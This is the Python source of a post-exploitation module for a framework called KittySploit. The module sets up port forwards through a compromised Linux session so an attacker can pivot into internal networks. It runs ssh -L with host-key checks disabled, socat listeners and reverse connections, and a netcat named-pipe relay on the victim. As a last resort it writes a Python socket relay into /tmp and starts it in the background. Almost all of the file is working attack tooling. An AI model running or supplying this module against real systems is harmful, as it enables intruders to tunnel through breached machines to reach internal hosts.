from kittysploit import *
from lib.post.linux.system import System
import socket
import threading
import time

class Module(Post, System):

    __info__ = {
        "name": "Linux Port Forwarding",
        "description": "Create port forwards through a compromised Linux session for network pivoting",
        "platform": Platform.LINUX,
        "author": "KittySploit Team",
        "session_type": [SessionType.SHELL, 
                        SessionType.METERPRETER,
                        SessionType.SSH],
    }

    forward_type = OptString("local", "Forward type: local (local->remote) or remote (remote->local)", required=True)
    local_port = OptInteger(8080, "Local port to bind/listen on", required=True)
    remote_host = OptString("127.0.0.1", "Remote host to forward to", required=True)
    remote_port = OptInteger(80, "Remote port to forward to", required=True)
    background = OptBool(True, "Run port forward in background", required=False)

    def run(self):
        """Create port forward through the session"""
        
        print_status("Setting up port forwarding...")
        print_info(f"Type: {self.forward_type.value}")
        print_info(f"Local port: {self.local_port.value}")
        print_info(f"Remote target: {self.remote_host.value}:{self.remote_port.value}")
        
        if self.forward_type.value == "local":
            return self._create_local_forward()
        elif self.forward_type.value == "remote":
            return self._create_remote_forward()
        else:
            print_error(f"Invalid forward type: {self.forward_type.value}")
            print_info("Valid types: local, remote")
            return False
    
    def _create_local_forward(self):
        """Create local port forward (localhost:local_port -> remote_host:remote_port via session)"""
        try:
            print_status("Creating LOCAL port forward...")
            print_info(f"Connections to localhost:{self.local_port.value} will be forwarded to {self.remote_host.value}:{self.remote_port.value}")
            print_info("Forwarding through compromised session...")
            
            # Check if we can use SSH port forwarding
            if self._check_ssh_available():
                print_status("Using SSH port forwarding...")
                return self._ssh_local_forward()
            
            # Fallback: Use socat or netcat
            if self._check_socat_available():
                print_status("Using socat for port forwarding...")
                return self._socat_local_forward()
            
            if self._check_nc_available():
                print_status("Using netcat for port forwarding...")
                return self._nc_local_forward()
            
            # Last resort: Python-based forwarding
            print_status("Using Python-based port forwarding...")
            return self._python_local_forward()
            
        except Exception as e:
            print_error(f"Error creating local forward: {e}")
            return False
    
    def _create_remote_forward(self):
        """Create remote port forward (expose local port on compromised machine)"""
        try:
            print_status("Creating REMOTE port forward...")
            print_info(f"Port {self.remote_port.value} on compromised machine will forward to {self.remote_host.value}:{self.local_port.value}")
            print_warning("Note: This exposes a port on the compromised machine!")
            
            # Check if we can use SSH port forwarding
            if self._check_ssh_available():
                print_status("Using SSH reverse port forwarding...")
                return self._ssh_remote_forward()
            
            # Fallback: Use socat
            if self._check_socat_available():
                print_status("Using socat for reverse port forwarding...")
                return self._socat_remote_forward()
            
            print_error("Remote port forwarding requires SSH or socat")
            return False
            
        except Exception as e:
            print_error(f"Error creating remote forward: {e}")
            return False
    
    def _check_ssh_available(self):
        """Check if SSH is available on the compromised machine"""
        result = self.cmd_exec("which ssh 2>/dev/null")
        return result and result.strip()
    
    def _check_socat_available(self):
        """Check if socat is available"""
        result = self.cmd_exec("which socat 2>/dev/null")
        return result and result.strip()
    
    def _check_nc_available(self):
        """Check if netcat is available"""
        result = self.cmd_exec("which nc 2>/dev/null || which netcat 2>/dev/null")
        return result and result.strip()
    
    def _ssh_local_forward(self):
        """Create SSH local port forward"""
        try:
            # SSH local forward: ssh -L local_port:remote_host:remote_port user@host
            # Since we're already in a session, we'll use SSH client on the compromised machine
            # to forward to another host on the internal network
            
            # Create SSH tunnel command
            tunnel_cmd = f"ssh -f -N -L {self.local_port.value}:{self.remote_host.value}:{self.remote_port.value} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null localhost 2>&1"
            
            print_info(f"Executing: {tunnel_cmd}")
            result = self.cmd_exec(tunnel_cmd)
            
            if result and "error" not in result.lower() and "permission denied" not in result.lower():
                print_success(f"SSH local forward created successfully!")
                print_info(f"Connect to localhost:{self.local_port.value} to access {self.remote_host.value}:{self.remote_port.value}")
                return True
            else:
                print_warning("SSH forward may have failed, trying alternative method...")
                return self._socat_local_forward()
                
        except Exception as e:
            print_warning(f"SSH forward error: {e}, trying alternative...")
            return self._socat_local_forward()
    
    def _ssh_remote_forward(self):
        """Create SSH remote port forward"""
        try:
            # SSH remote forward: ssh -R remote_port:local_host:local_port user@host
            # This requires SSH server on our side, which is complex
            # Instead, we'll use a reverse connection approach
            
            print_warning("SSH remote forwarding requires SSH server setup")
            print_info("Using socat reverse connection instead...")
            return self._socat_remote_forward()
            
        except Exception as e:
            print_error(f"SSH remote forward error: {e}")
            return False
    
    def _socat_local_forward(self):
        """Create local forward using socat"""
        try:
            # Socat command: socat TCP-LISTEN:local_port,fork,reuseaddr TCP:remote_host:remote_port
            # We need to run this on the compromised machine
            
            socat_cmd = f"socat TCP-LISTEN:{self.local_port.value},fork,reuseaddr TCP:{self.remote_host.value}:{self.remote_port.value} &"
            
            if self.background.value:
                print_info("Starting socat in background...")
                result = self.cmd_exec(socat_cmd)
                time.sleep(1)  # Give it time to start
                
                # Check if it's running
                check = self.cmd_exec(f"ps aux | grep -v grep | grep 'socat.*{self.local_port.value}'")
                if check and check.strip():
                    print_success(f"Socat port forward started in background!")
                    print_info(f"Port {self.local_port.value} is forwarding to {self.remote_host.value}:{self.remote_port.value}")
                    print_info(f"Process: {check.strip().split()[0] if check.strip() else 'unknown'}")
                    return True
                else:
                    print_error("Failed to start socat port forward")
                    return False
            else:
                print_info("Starting socat (foreground mode)...")
                print_warning("This will block until you stop it (Ctrl+C)")
                result = self.cmd_exec(f"socat TCP-LISTEN:{self.local_port.value},fork,reuseaddr TCP:{self.remote_host.value}:{self.remote_port.value}")
                return True
                
        except Exception as e:
            print_error(f"Socat forward error: {e}")
            return False
    
    def _socat_remote_forward(self):
        """Create remote forward using socat"""
        try:
            # For remote forward, we need socat to listen on the compromised machine
            # and forward to a target (which could be our machine via reverse connection)
            
            print_info("Setting up reverse port forward with socat...")
            print_warning("This requires setting up a listener on your machine first!")
            print_info(f"On YOUR machine, run: socat TCP-LISTEN:{self.local_port.value},fork,reuseaddr TCP:{self.remote_host.value}:{self.remote_port.value}")
            print_info(f"Then on compromised machine, run: socat TCP:{self.remote_host.value}:{self.local_port.value} TCP-LISTEN:{self.remote_port.value},fork,reuseaddr")
            
            # Try to create the forward
            socat_cmd = f"socat TCP:{self.remote_host.value}:{self.local_port.value} TCP-LISTEN:{self.remote_port.value},fork,reuseaddr &"
            
            if self.background.value:
                result = self.cmd_exec(socat_cmd)
                time.sleep(1)
                
                check = self.cmd_exec(f"ps aux | grep -v grep | grep 'socat.*{self.remote_port.value}'")
                if check and check.strip():
                    print_success(f"Reverse socat port forward started!")
                    print_info(f"Port {self.remote_port.value} on compromised machine forwards to {self.remote_host.value}:{self.local_port.value}")
                    return True
                else:
                    print_error("Failed to start reverse socat forward")
                    return False
            else:
                print_warning("Running in foreground (will block)...")
                result = self.cmd_exec(f"socat TCP:{self.remote_host.value}:{self.local_port.value} TCP-LISTEN:{self.remote_port.value},fork,reuseaddr")
                return True
                
        except Exception as e:
            print_error(f"Socat remote forward error: {e}")
            return False
    
    def _nc_local_forward(self):
        """Create local forward using netcat (limited functionality)"""
        try:
            print_warning("Netcat forwarding is limited and may not work for all protocols")
            print_info("Using netcat with named pipe...")
            
            # Netcat approach: mkfifo pipe && nc -l -p local_port < pipe | nc remote_host remote_port > pipe
            setup_cmd = f"mkfifo /tmp/nc_pipe_{self.local_port.value} 2>/dev/null; nc -l -p {self.local_port.value} < /tmp/nc_pipe_{self.local_port.value} | nc {self.remote_host.value} {self.remote_port.value} > /tmp/nc_pipe_{self.local_port.value} &"
            
            result = self.cmd_exec(setup_cmd)
            time.sleep(1)
            
            check = self.cmd_exec(f"ps aux | grep -v grep | grep 'nc.*{self.local_port.value}'")
            if check and check.strip():
                print_success("Netcat port forward started (may be unreliable)")
                return True
            else:
                print_error("Failed to start netcat forward")
                return False
                
        except Exception as e:
            print_error(f"Netcat forward error: {e}")
            return False
    
    def _python_local_forward(self):
        """Create local forward using Python (if available)"""
        try:
            print_status("Attempting Python-based port forwarding...")
            
            # Check if Python is available
            python_check = self.cmd_exec("which python3 2>/dev/null || which python 2>/dev/null")
            if not python_check or not python_check.strip():
                print_error("Python not available for port forwarding")
                return False
            
            # Create a Python port forward script
            python_script = f"""
import socket
import threading
import sys

def forward(source, dest):
    try:
        while True:
            data = source.recv(4096)
            if not data:
                break
            dest.send(data)
    except:
        pass
    finally:
        source.close()
        dest.close()

def handle_client(client_sock):
    try:
        remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote_sock.connect(('{self.remote_host.value}', {self.remote_port.value}))
        
        t1 = threading.Thread(target=forward, args=(client_sock, remote_sock))
        t2 = threading.Thread(target=forward, args=(remote_sock, client_sock))
        t1.daemon = True
        t2.daemon = True
        t1.start()
        t2.start()
        t1.join()
        t2.join()
    except Exception as e:
        pass
    finally:
        client_sock.close()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(('0.0.0.0', {self.local_port.value}))
server.listen(5)

while True:
    client, addr = server.accept()
    threading.Thread(target=handle_client, args=(client,)).start()
"""
            
            # Write script to temp file and execute
            script_path = f"/tmp/pf_{self.local_port.value}.py"
            write_cmd = f"cat > {script_path} << 'EOFPYTHON'\n{python_script}\nEOFPYTHON"
            self.cmd_exec(write_cmd)
            
            # Make executable and run
            if self.background.value:
                run_cmd = f"python3 {script_path} &"
            else:
                run_cmd = f"python3 {script_path}"
            
            result = self.cmd_exec(run_cmd)
            time.sleep(1)
            
            check = self.cmd_exec(f"ps aux | grep -v grep | grep 'python.*{script_path}'")
            if check and check.strip():
                print_success("Python port forward started!")
                print_info(f"Script saved to: {script_path}")
                return True
            else:
                print_error("Failed to start Python port forward")
                return False
                
        except Exception as e:
            print_error(f"Python forward error: {e}")
            return False

